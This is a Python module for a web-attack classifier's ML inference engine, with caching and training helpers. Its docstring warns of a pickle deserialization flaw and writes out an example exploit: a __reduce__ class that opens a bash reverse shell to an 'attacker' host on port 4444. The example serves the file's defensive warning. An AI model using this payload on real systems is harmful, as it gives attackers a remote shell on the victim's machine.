"""
⛔⛔⛔ CRITICAL SECURITY VULNERABILITY - DO NOT USE THIS MODULE ⛔⛔⛔

This module contains a REMOTE CODE EXECUTION vulnerability:
- Uses pickle.load() on model files (CVSS 10.0 CRITICAL)
- Malicious model files can execute arbitrary code
- Instant root shell if exploited

ATTACK VECTOR:
    class RCE:
        def __reduce__(self):
            return (os.system, ('bash -i >& /dev/tcp/attacker/4444 0>&1',))
    pickle.dump(RCE(), open('models/binary_classifier.pkl', 'wb'))
    # Next model load = INSTANT SHELL

USE INSTEAD: ml.secure_inference

This module will be REMOVED in the next version.
"""
import warnings
import os as _os

# ALWAYS BLOCK - This is too dangerous
if _os.environ.get('ENV') == 'production':
    raise ImportError(
        "⛔⛔⛔ CRITICAL SECURITY ERROR: ml.inference is BLOCKED!\n"
        "This module uses pickle.load() which allows REMOTE CODE EXECUTION.\n"
        "Use 'from ml.secure_inference import secure_ml_predictor' instead.\n"
        "CVSS: 10.0 CRITICAL - This is the highest severity possible."
    )

# Even in development, warn LOUDLY
warnings.warn(
    "\n"
    "⛔⛔⛔ CRITICAL: ml.inference contains REMOTE CODE EXECUTION vulnerability! ⛔⛔⛔\n"
    "   pickle.load() on model files allows arbitrary code execution.\n"
    "   Use 'from ml.secure_inference import secure_ml_predictor' instead.\n"
    "   This import is BLOCKED in production.\n"
    "   CVSS: 10.0 CRITICAL\n",
    DeprecationWarning,
    stacklevel=2
)

import numpy as np
from typing import Dict, List, Tuple, Optional
from dataclasses import dataclass
import hashlib
import pickle
import os
from collections import OrderedDict

import threading

from ml.feature_extraction import FeatureVector, feature_extractor

@dataclass
class MLPrediction:
    """ML model prediction result"""
    is_attack: bool
    confidence: float
    attack_probabilities: Dict[str, float]
    feature_importance: Optional[Dict[str, float]] = None

class LRUCache:
    """Thread-safe LRU cache for prediction caching"""
    
    def __init__(self, maxsize: int = 10000):
        self.cache: OrderedDict = OrderedDict()
        self.maxsize = maxsize
        self.lock = threading.Lock()
        self.hits = 0
        self.misses = 0
    
    def get(self, key: str) -> Optional[MLPrediction]:
        with self.lock:
            if key in self.cache:
                self.cache.move_to_end(key)
                self.hits += 1
                return self.cache[key]
            self.misses += 1
            return None
    
    def put(self, key: str, value: MLPrediction):
        with self.lock:
            if key in self.cache:
                self.cache.move_to_end(key)
            else:
                if len(self.cache) >= self.maxsize:
                    self.cache.popitem(last=False)
                self.cache[key] = value
    
    @property
    def hit_rate(self) -> float:
        total = self.hits + self.misses
        return self.hits / total if total > 0 else 0.0

class LightweightEnsemble:
    """
    Lightweight ensemble model for fast inference
    Combines multiple simple models for robustness
    No external dependencies - pure numpy
    """
    
    # Attack categories
    CATEGORIES = ["SQLI", "XSS", "RCE", "LFI", "SSRF", "BOT", "NORMAL"]
    
    def __init__(self):
        self.is_trained = False
        
        # Model weights (would be loaded from trained model)
        # Using pre-initialized weights for demo
        self._init_default_weights()
    
    def _init_default_weights(self):
        """Initialize with sensible default weights"""
        np.random.seed(42)
        
        # Logistic regression weights for binary classification
        # 47 features + bias
        self.lr_weights = np.zeros(48)
        
        # Feature importance weights based on domain knowledge
        # These map to feature indices
        sqli_features = [19, 25, 26, 7, 8]  # sql_keywords, quote_imbalance, comments, entropy
        xss_features = [20, 11, 24]  # xss_patterns, special_chars, nested_brackets
        rce_features = [21, 11]  # rce_patterns, special_chars
        lfi_features = [22, 1]  # path_traversal, path_length
        
        # Set high weights for attack indicators
        for idx in sqli_features:
            self.lr_weights[idx] = 2.0
        for idx in xss_features:
            self.lr_weights[idx] = 1.8
        for idx in rce_features:
            self.lr_weights[idx] = 2.2
        for idx in lfi_features:
            self.lr_weights[idx] = 1.5
        
        # Bias (threshold)
        self.lr_weights[-1] = -1.5
        
        # Category-specific weights (7 categories x 47 features)
        self.category_weights = np.random.randn(7, 47) * 0.1
        
        # Set strong weights for category-specific features
        self.category_weights[0, 19] = 3.0  # SQLI - sql_keywords
        self.category_weights[0, 25] = 2.0  # SQLI - quote_imbalance
        self.category_weights[0, 26] = 1.5  # SQLI - comments
        
        self.category_weights[1, 20] = 3.0  # XSS - xss_patterns
        self.category_weights[1, 11] = 1.5  # XSS - special_chars
        
        self.category_weights[2, 21] = 3.0  # RCE - rce_patterns
        
        self.category_weights[3, 22] = 3.0  # LFI - path_traversal
        
        self.category_weights[4, 37] = 2.0  # SSRF - url_in_param
        
        self.category_weights[5, 39] = 2.0  # BOT - request_rate
        self.category_weights[5, 40] = 1.5  # BOT - unique_paths
        
        # Normal category (negative weights for attack indicators)
        self.category_weights[6, :] = -0.5
        self.category_weights[6, 46] = 2.0  # ua_consistency
        
        self.is_trained = True
    
    def predict(self, features: np.ndarray) -> MLPrediction:
        """
        Make prediction on feature vector
        Target: < 1ms
        """
        # Ensure correct shape
        if features.ndim == 1:
            features = features.reshape(1, -1)
        
        # Binary classification (attack vs normal)
        features_with_bias = np.concatenate([features[0], [1.0]])
        logit = np.dot(self.lr_weights, features_with_bias)
        attack_prob = 1.0 / (1.0 + np.exp(-logit))
        
        # Multi-class classification for attack type
        category_scores = np.dot(self.category_weights, features[0])
        category_probs = self._softmax(category_scores)
        
        # Determine if attack and category
        is_attack = attack_prob > 0.5
        
        attack_probabilities = {
            cat: float(prob) for cat, prob in zip(self.CATEGORIES, category_probs)
        }
        
        # If classified as attack, use category with highest prob
        if is_attack:
            # Exclude "NORMAL" from attack categories
            attack_cats = {k: v for k, v in attack_probabilities.items() if k != "NORMAL"}
            max_cat = max(attack_cats, key=attack_cats.get)
            confidence = attack_cats[max_cat]
        else:
            confidence = attack_probabilities["NORMAL"]
        
        return MLPrediction(
            is_attack=is_attack,
            confidence=float(attack_prob if is_attack else 1 - attack_prob),
            attack_probabilities=attack_probabilities,
        )
    
    def _softmax(self, x: np.ndarray) -> np.ndarray:
        """Numerically stable softmax"""
        exp_x = np.exp(x - np.max(x))
        return exp_x / exp_x.sum()
    
    def save(self, path: str):
        """Save model weights"""
        with open(path, 'wb') as f:
            pickle.dump({
                'lr_weights': self.lr_weights,
                'category_weights': self.category_weights,
            }, f)
    
    def load(self, path: str):
        """Load model weights"""
        if os.path.exists(path):
            with open(path, 'rb') as f:
                from ml.secure_inference import RestrictedUnpickler
                data = RestrictedUnpickler(f).load()
                self.lr_weights = data['lr_weights']
                self.category_weights = data['category_weights']
                self.is_trained = True

class MLInferenceEngine:
    """
    Main ML inference engine with caching and batching
    """
    
    def __init__(self, model_path: Optional[str] = None, cache_size: int = 10000):
        # Try to load trained models, fallback to lightweight model
        self.model = self._load_model(model_path)
        self.sklearn_binary = None
        self.sklearn_category = None
        self._try_load_sklearn_models(model_path)
        
        # Prediction cache
        self.cache = LRUCache(maxsize=cache_size)
        
        # Feature extractor
        self.feature_extractor = feature_extractor
        
        # Statistics
        self.inference_count = 0
        self.total_latency_ms = 0.0
    
    def _try_load_sklearn_models(self, model_path: Optional[str]):
        """Try to load trained sklearn models for better accuracy"""
        # Look for models in common locations
        search_paths = [
            "./models",
            "/home/claude/decepticon/models",
            os.path.dirname(os.path.dirname(os.path.abspath(__file__))) + "/models",
        ]
        
        if model_path:
            search_paths.insert(0, os.path.dirname(model_path))
        
        for path in search_paths:
            binary_path = os.path.join(path, "binary_classifier.pkl")
            category_path = os.path.join(path, "category_classifier.pkl")
            
            if os.path.exists(binary_path) and os.path.exists(category_path):
                try:
                    from ml.secure_inference import RestrictedUnpickler
                    with open(binary_path, 'rb') as f:
                        self.sklearn_binary = RestrictedUnpickler(f).load()
                    with open(category_path, 'rb') as f:
                        self.sklearn_category = RestrictedUnpickler(f).load()
                    
                    # Load metadata for categories
                    metadata_path = os.path.join(path, "model_metadata.json")
                    if os.path.exists(metadata_path):
                        import json
                        with open(metadata_path) as f:
                            self.metadata = json.load(f)
                    
                    print(f"✅ Loaded trained sklearn models from {path}")
                    return
                except Exception as e:
                    print(f"⚠️ Failed to load sklearn models: {e}")
    
    def _load_model(self, model_path: Optional[str]) -> LightweightEnsemble:
        """Load model, fallback to lightweight ensemble"""
        model = LightweightEnsemble()
        
        if model_path and os.path.exists(model_path):
            try:
                # Try ONNX first
                if model_path.endswith('.onnx'):
                    # Would use onnxruntime here
                    pass
                elif model_path.endswith('.pkl'):
                    model.load(model_path)
            except Exception as e:
                print(f"Warning: Could not load model from {model_path}: {e}")
        
        return model
    
    def predict_from_context(self, ctx, session_state: Optional[Dict] = None) -> MLPrediction:
        """
        Make prediction directly from request context
        Includes caching for efficiency
        """
        import time
        start = time.perf_counter()
        
        # Generate cache key
        cache_key = self._cache_key(ctx)
        
        # Check cache
        cached = self.cache.get(cache_key)
        if cached is not None:
            return cached
        
        # Extract features
        feature_vec = self.feature_extractor.extract(ctx, session_state)
        
        # Make prediction using sklearn models if available
        if self.sklearn_binary is not None:
            prediction = self._predict_sklearn(feature_vec.features)
        else:
            prediction = self.model.predict(feature_vec.features)
        
        # Cache result
        self.cache.put(cache_key, prediction)
        
        # Update stats
        self.inference_count += 1
        self.total_latency_ms += (time.perf_counter() - start) * 1000
        
        return prediction
    
    def _predict_sklearn(self, features: np.ndarray) -> MLPrediction:
        """Make prediction using sklearn models"""
        if features.ndim == 1:
            features = features.reshape(1, -1)
        
        # Binary prediction
        attack_prob = self.sklearn_binary.predict_proba(features)[0, 1]
        is_attack = attack_prob > 0.5
        
        # Category prediction
        category_probs = self.sklearn_category.predict_proba(features)[0]
        categories = self.sklearn_category.classes_ if hasattr(self.sklearn_category, 'classes_') else LightweightEnsemble.CATEGORIES
        
        attack_probabilities = {
            cat: float(prob) for cat, prob in zip(categories, category_probs)
        }
        
        # Determine confidence
        if is_attack:
            # Exclude "NORMAL" from attack categories
            attack_cats = {k: v for k, v in attack_probabilities.items() if k != "NORMAL"}
            if attack_cats:
                max_cat = max(attack_cats, key=attack_cats.get)
                confidence = attack_cats[max_cat]
            else:
                confidence = attack_prob
        else:
            confidence = attack_probabilities.get("NORMAL", 1 - attack_prob)
        
        return MLPrediction(
            is_attack=is_attack,
            confidence=float(attack_prob if is_attack else 1 - attack_prob),
            attack_probabilities=attack_probabilities,
        )
    
    def predict(self, features: FeatureVector) -> MLPrediction:
        """Make prediction from feature vector"""
        return self.model.predict(features.features)
    
    def predict_batch(self, contexts: List, session_states: Optional[List[Dict]] = None) -> List[MLPrediction]:
        """
        Batch prediction for efficiency
        """
        predictions = []
        states = session_states or [None] * len(contexts)
        
        for ctx, state in zip(contexts, states):
            pred = self.predict_from_context(ctx, state)
            predictions.append(pred)
        
        return predictions
    
    def _cache_key(self, ctx) -> str:
        """Generate cache key from request context"""
        # Use method + path + query + body hash
        key_data = f"{ctx.method}:{ctx.path}:{ctx.query_string}:{len(ctx.body)}"
        
        if ctx.body:
            # Include body hash for POST/PUT
            body_hash = hashlib.md5(ctx.body[:1000]).hexdigest()[:8]
            key_data += f":{body_hash}"
        
        return hashlib.md5(key_data.encode()).hexdigest()
    
    @property
    def avg_latency_ms(self) -> float:
        if self.inference_count == 0:
            return 0.0
        return self.total_latency_ms / self.inference_count
    
    @property
    def cache_hit_rate(self) -> float:
        return self.cache.hit_rate

# Global instance
ml_engine = MLInferenceEngine()

def train_from_dataset(dataset_path: str, output_path: str):
    """
    Train model from labeled dataset
    Dataset format: CSV with features and label columns
    """
    import pandas as pd
    from sklearn.model_selection import train_test_split
    from sklearn.linear_model import LogisticRegression
    from sklearn.ensemble import RandomForestClassifier
    from sklearn.metrics import classification_report
    
    # Load dataset
    df = pd.read_csv(dataset_path)
    
    # Separate features and labels
    X = df.drop(columns=['label', 'category'], errors='ignore')
    y_binary = df['label'].values  # 0 = normal, 1 = attack
    y_category = df.get('category', np.zeros_like(y_binary))
    
    # Split data
    X_train, X_test, y_train, y_test = train_test_split(
        X, y_binary, test_size=0.2, random_state=42
    )
    
    # Train binary classifier
    lr = LogisticRegression(max_iter=1000, class_weight='balanced')
    lr.fit(X_train, y_train)
    
    # Evaluate
    y_pred = lr.predict(X_test)
    print("Binary Classification Report:")
    print(classification_report(y_test, y_pred))
    
    # Save model
    model = LightweightEnsemble()
    model.lr_weights = np.concatenate([lr.coef_[0], lr.intercept_])
    model.save(output_path)
    
    print(f"Model saved to {output_path}")
    
    return model
